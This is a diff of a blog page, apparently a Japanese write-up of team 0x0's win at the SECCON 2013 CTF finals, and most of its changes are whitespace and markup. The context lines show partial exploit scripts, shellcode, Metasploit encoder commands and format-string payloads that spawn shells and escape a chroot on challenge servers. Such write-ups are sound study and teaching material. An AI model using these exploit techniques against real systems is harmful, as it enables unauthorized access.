@@ -5,11 +5,10 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.59.1 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="generator" content="Hugo 0.61.0 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Kazutoshi Noguchi">
 <meta name="keywords" content="">
 <meta name="description" content="結果
-
 
 
  
@@ -35,7 +34,6 @@
 
 
 
-
  
   
   
@@ -57,11 +55,8 @@
   
 
 
-
 問題一覧の画像とCSSを保存し忘れた。 
-
 チーム0x0としてSECCON 2013 全国大会に参加しました。
-
 今回のメンバーはwasao, waidotto, nolzeと私です。
 4139ptで優勝しました。">
 
@@ -69,7 +64,6 @@
 <meta property="og:description" content="結果
 
 
-
  
   
   
@@ -89,7 +83,6 @@
    
     スコアの推移
   
-
 
 
 
@@ -115,11 +108,8 @@
   
 
 
-
 問題一覧の画像とCSSを保存し忘れた。 
-
 チーム0x0としてSECCON 2013 全国大会に参加しました。
-
 今回のメンバーはwasao, waidotto, nolzeと私です。
 4139ptで優勝しました。">
 <meta property="og:type" content="article">
@@ -131,7 +121,6 @@
 <meta property="og:description" content="結果
 
 
-
  
   
   
@@ -151,7 +140,6 @@
    
     スコアの推移
   
-
 
 
 
@@ -177,17 +165,13 @@
   
 
 
-
 問題一覧の画像とCSSを保存し忘れた。 
-
 チーム0x0としてSECCON 2013 全国大会に参加しました。
-
 今回のメンバーはwasao, waidotto, nolzeと私です。
 4139ptで優勝しました。">
 <meta name="twitter:description" content="結果
 
 
-
  
   
   
@@ -207,7 +191,6 @@
    
     スコアの推移
   
-
 
 
 
@@ -233,11 +216,8 @@
   
 
 
-
 問題一覧の画像とCSSを保存し忘れた。 
-
 チーム0x0としてSECCON 2013 全国大会に参加しました。
-
 今回のメンバーはwasao, waidotto, nolzeと私です。
 4139ptで優勝しました。">
 <meta property="og:locale" content="ja">
@@ -335,7 +315,7 @@
         </a>
         <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
         
-          <h5 class="sidebar-profile-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</h5>
+          <h5 class="sidebar-profile-bio">I'm interested in InfoSec, Trip, Electronics, and DIY.</h5>
         
       </div>
     
@@ -470,8 +450,7 @@
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <h2 id="結果">結果</h2>
-
+              <h2 id="heading">結果</h2>
 
 
  
@@ -497,7 +476,6 @@
 
 
 
-
  
   
   
@@ -519,22 +497,14 @@
   
 </div>
 
-
 <p>問題一覧の画像とCSSを保存し忘れた。 </p>
-
 <p>チーム0x0としてSECCON 2013 全国大会に参加しました。</p>
-
-<p>今回のメンバーはwasao, waidotto, nolzeと私です。<br />
+<p>今回のメンバーはwasao, waidotto, nolzeと私です。<br>
 4139ptで優勝しました。</p>
-
-<h2 id="解いた問題">解いた問題</h2>
-
-<h3 id="2-kaku">2.kaku</h3>
-
+<h2 id="heading-1">解いた問題</h2>
+<h3 id="2kaku">2.kaku</h3>
 <p>通天閣</p>
-
 <p>問題ページでデーモンのバイナリ・ソースコード・xinetdの設定ファイルを固めたzipと、デーモンのアドレスが公開されている。</p>
-
 <ol>
 <li>forkを無効にする</li>
 <li>権限を降格</li>
@@ -542,17 +512,11 @@
 <li>フィルタにひっかからないかチェック</li>
 <li>実行</li>
 </ol>
-
 <p>するデーモンが動いている。</p>
-
 <p>ステージをクリアしキーワードを送信すると次のステージが現れる。</p>
-
 <h4 id="stage1">stage1</h4>
-
 <p>制限なし。やるだけ</p>
-
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 import pack
 import sys
@@ -570,27 +534,18 @@ sys.stdout.write(pack.pl32(len(buf)))
 sys.stdout.flush()
 sys.stdout.write(buf)
 </code></pre>
-
 <h4 id="stage2">stage2</h4>
-
 <p>フィルターでシェルコードが 英数字で構成されているかチェックされる。</p>
-
 <p>metasploitのx86/alpha_mixed
 エンコーダでシェルコードを英数字に変換する。</p>
-
 <p>alpha_mixedエンコーダは
 シェルコードのアドレスが入ったレジスタを指定しないとシェルコードの全てが英数字にならない。</p>
-
 <p>シェルコードへのアドレスがEAXに残っているので、</p>
-
 <pre><code>msf&gt; set BufferRegister EAX
 msf&gt; generate -e x86/alpha_mixed
 </code></pre>
-
 <p>でシェルコードを生成する。</p>
-
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 import pack
 import sys
@@ -618,11 +573,8 @@ sys.stdout.write(pack.pl32(len(buf)))
 sys.stdout.flush()
 sys.stdout.write(buf)
 </code></pre>
-
 <h4 id="stage3">stage3</h4>
-
 <p>シェルコードがアセンブラ短歌のフォーマットになっているかチェックするようになる。</p>
-
 <pre><code>#include &lt;libdis.h&gt;
  
 static const int phrase_lengths[] = {5, 7, 5, 7, 7};
@@ -672,20 +624,14 @@ END:
     return retval;
 }
 </code></pre>
-
 <p>5命令でファイルを表示するのは難しいので、freadでシェルコードを末尾に追加する。</p>
-
 <p><a href="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/#hack-this-site-bin500">オンライン予選のbin500と同じように</a>
 プレフィックスを付けて命令長を調整した。</p>
-
 <p>stdin 変数は 0x08049184にあるが、 push dword
 [0x08049184]は6バイトになってしまう。esp+0x10にstdin変数の中身が残っているのでそれをpushする。</p>
-
 <p>終了後に 最大5命令しか使えないわけではなく 命令の途中が5, 7, 5, 7,
 7バイトに引っかかっていなければよいことに気づいた。</p>
-
 <p>stage1:</p>
-
 <pre><code>bits 32
 org 0x80491c0
  
@@ -707,9 +653,7 @@ call 0x08048780 ;fread
  
 stage2:
 </code></pre>
-
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 import pack
 import sys
@@ -730,21 +674,14 @@ buf += &quot;\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x6b\x65\x79\x77&quot;
 buf += &quot;\x6f\x72\x64\x2e\x74\x78\x74\x00&quot;
 sys.stdout.write(buf)
 </code></pre>
-
 <h4 id="stage4">stage4</h4>
-
 <p>nabytes.binの中身(最大2バイト) の一部
 がシェルコードに含まれていないかチェックするようになる。</p>
-
 <p>nabytes.binの中身は空だった。</p>
-
 <p>flagword.txtに自チームのフラッグワードを書き込むことができる。</p>
-
 <p>終了後に作問者から
 nabytes.binに書き込んで他のチームを妨害できると教えてもらった。</p>
-
 <p>shellcode_stage1.asm:</p>
-
 <pre><code>bits 32
 org 0x804a340
  
@@ -767,9 +704,7 @@ call 0x08048810 ;fread
  
 stage2:
 </code></pre>
-
 <p>shellcode_stage2.asm:</p>
-
 <pre><code>org 0x804a340 + 5 + 7 + 5 + 7 + 7
 bits 32
  
@@ -792,9 +727,7 @@ flagword:
 db &quot;95f13c77edc735fc82258d878a54d91e&quot;, 0x0a
 flagword_end:
 </code></pre>
-
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 import pack
 import sys
@@ -808,15 +741,10 @@ sys.stdout.write(buf)
 buf = open(&quot;shellcode_stage2&quot;, &quot;rb&quot;).read()
 sys.stdout.write(buf)
 </code></pre>
-
 <h3 id="druaga">Druaga</h3>
-
 <p>ドルアーガの塔</p>
-
 <p>サーバーからダウンロードできる yuko_oshima.binはtruecryptのボリュームらしい。</p>
-
 <p>展開するとキーワードとzipが出てくる。</p>
-
 <pre><code>$ nkf KEY\{OoiOtya\}.txt 
 Linux/x86環境にて 0609 と表示するアセンブラ短歌を探し出し
 そのアセンブラ短歌が書かれた画像の MD5値 を求めよ！
@@ -827,10 +755,8 @@ KEY{MD5(taka.jpg)}
 
 Enjoy Hacking! :)
 </code></pre>
-
 <p>朝起きたらすでにチームメイトが画像をテキストに変換するコードを完成させていたので、3/
 を変換して下のコードで実行させてみたら 0609 が出てきた。運が良かった。</p>
-
 <pre><code>#!/usr/bin/python
 import subprocess
 import sys
@@ -862,24 +788,15 @@ int main(int argc, char **argv) {
     return ((int (*)())buf)();
 }
 </code></pre>
-
 <p>/3/93/73/taka.jpgが正解のファイル。</p>
-
 <p>あとはチームメイトが解いた。</p>
-
 <p>@waidottoのwriteup: <a href="http://d.hatena.ne.jp/waidotto/20140303">SECCON 2013 全国大会 Write up</a></p>
-
 <h3 id="hanoi">Hanoi</h3>
-
 <p>ハノイの塔</p>
-
 <h4 id="stage1-1">stage1</h4>
-
 <p>readfile.phpにファイル名と ファイル名のmd5sumを渡すと
 特定のファイルを読み込める。</p>
-
 <p>readfile.phpでindex.phpを読み込むとキーワードが出てくる。</p>
-
 <pre><code>Access granted to index.php!
 
 if ($_SERVER[REQUEST_METHOD] == 'POST')
@@ -897,41 +814,25 @@ echo &quot;ACCESS DENIED!
 ?&gt;
 ...
 </code></pre>
-
 <p>top.gifの後にDNSのパケットがくっついていたので、送信元のサーバーを調べてみたがよくわからなかった。</p>
-
 <p>勘でstage3のサーバーを見つけたが時間切れになった。</p>
-
 <h3 id="babel">Babel</h3>
-
 <p>バベルの塔</p>
-
 <p>babel.tower:5060で pureserver、babel.tower:5061で
 jamserverが動いていて、両方のバイナリにフォーマット文字列脆弱性がある。</p>
-
 <pre><code>$ file *server
 jamserver:  ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x4788d869615da8fec8c98810fb205940a0a9af1f, not stripped
 pureserver: ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x01adec44d315228ee41dc71ed8eb2e4d1656d50d, not stripped
 </code></pre>
-
 <h4 id="stage1-2">stage1</h4>
-
 <p>jamserverに接続すると実行される /home/jam/bin/putskeyの出力にAAで「Key is CurryRice」と書かれているが、制御文字で隠されている。</p>
-
 <p>lessで表示したら答えが出てきた。</p>
-
 <h4 id="stage2-1">stage2</h4>
-
 <p>pureserverは 入力を受け取りprintfした後、 /usr/bin/calを起動する。</p>
-
-<p>&rdquo;/usr/bin/cal&rdquo;を指すポインタが書き換え可能。バイナリ内に&rdquo;/bin/sh&rdquo;があるので、そこにポインタを変更することでシェルを起動できる。</p>
-
+<p>&ldquo;/usr/bin/cal&quot;を指すポインタが書き換え可能。バイナリ内に&rdquo;/bin/sh&quot;があるので、そこにポインタを変更することでシェルを起動できる。</p>
 <p>/home/pure/key.txtのキーワードを読み込めるようになる。</p>
-
 <p>フラッグワードのファイルに書き込むにはjamserverの権限が必要なので、まだ書き込めない。</p>
-
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 #pureserver
 from libformatstr import *
@@ -945,23 +846,14 @@ p[DEST] = BINSH
  
 print p.payload(BUFIDX)
 </code></pre>
-
 <h4 id="stage3-1">stage3</h4>
-
-<p>jamserverは /home/jamにchrootし権限降格した後、/bin/putskeyを起動する。文字列&rdquo;/bin/putskey&rdquo;が書き換え可能。</p>
-
+<p>jamserverは /home/jamにchrootし権限降格した後、/bin/putskeyを起動する。文字列&rdquo;/bin/putskey&quot;が書き換え可能。</p>
 <p>/home/jam/tmpのパーミッションが777なのでpureserverの権限でファイルをコピーできる。</p>
-
 <p>chroot環境には最低限のライブラリしか入っていないので、jamserverでの作業にはbusyboxを使う。</p>
-
 <p>まず、pureserverのシェルで busyboxを /home/jam/tmpにコピーする。</p>
-
 <p>次に/bin/shを/home/jam/tmp/putskeyとしてコピーする。(入力文字列の長さ制限が厳しいので、最低限の書き換えで済むようにする)</p>
-
-<p>exploitで&rdquo;/bin/putskey&rdquo;を&rdquo;/tmp/putskey&rdquo;に書き換えてシェルを起動すると、/home/jam/key.txtにあるキーワードを読み込めるようになる。</p>
-
+<p>exploitで&rdquo;/bin/putskey&quot;を&rdquo;/tmp/putskey&quot;に書き換えてシェルを起動すると、/home/jam/key.txtにあるキーワードを読み込めるようになる。</p>
 <p>exploit:</p>
-
 <pre><code>#!/usr/bin/python
 from libformatstr import *
 import sys
@@ -974,13 +866,9 @@ p[DEST] = &quot;/tmp&quot;
  
 sys.stdout.write(p.payload(BUFIDX))
 </code></pre>
-
 <h4 id="stage4-1">stage4</h4>
-
 <p>jamserverでシェルをsetuidし、pureserverから叩くことでchroot環境外でjamユーザになれる。</p>
-
 <p>/home/key.txtにあるキーワードが読み込めるようになる。</p>
-
 <p>さらに/var/www/flag.txtにフラッグワードを書き込むことができるようになる。</p>
               
             </div>
@@ -1192,7 +1080,7 @@ sys.stdout.write(p.payload(BUFIDX))
     
     <h4 id="about-card-name">Kazutoshi Noguchi</h4>
     
-      <div id="about-card-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</div>
+      <div id="about-card-bio">I'm interested in InfoSec, Trip, Electronics, and DIY.</div>
     
     
       <div id="about-card-job">
